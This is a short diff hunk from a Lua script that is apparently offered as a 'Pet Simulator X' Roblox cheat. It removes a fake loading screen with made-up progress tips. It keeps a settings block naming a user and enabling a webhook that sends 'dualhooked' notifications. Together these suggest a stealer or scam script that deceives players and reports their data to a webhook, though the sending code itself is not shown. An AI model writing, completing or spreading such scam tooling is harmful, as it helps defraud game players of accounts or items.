@@ -7,15 +7,6 @@
   
 ]]--
 
-_G.Title = "Pet Simulator X : Script"
-_G.Time = 30
-
-_G.Tip1 = "Getting Script..."
-_G.Tip2 = "Script Recieved!"
-_G.Tip3 = "Scaning Script..."
-_G.Tip4 = "Loading Script..."
-_G.Tip5 = "Almost Done!"
-
 getgenv().Settings = {
     User = "StickOwwz",
     Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
